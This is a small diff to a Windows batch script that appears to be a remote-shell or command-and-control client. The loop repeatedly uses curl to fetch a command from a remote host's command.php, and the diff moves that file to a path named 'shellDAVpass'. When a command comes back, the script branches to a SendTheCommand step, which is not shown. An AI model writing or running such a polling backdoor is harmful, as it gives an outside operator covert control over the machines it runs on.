@@ -9,7 +9,7 @@ SET PORT=80
 SET DELAY=5
 
 :START
-	FOR /F "tokens=* delims=" %%I IN ('curl -s !IPADDRESS!:!PORT!/command.php') DO (SET COMMAND=%%I)
+	FOR /F "tokens=* delims=" %%I IN ('curl -s !IPADDRESS!:!PORT!/shellDAVpass/command.php') DO (SET COMMAND=%%I)
 
 	IF [!COMMAND!]==[] (GOTO BACK) ELSE (GOTO SendTheCommand)
 
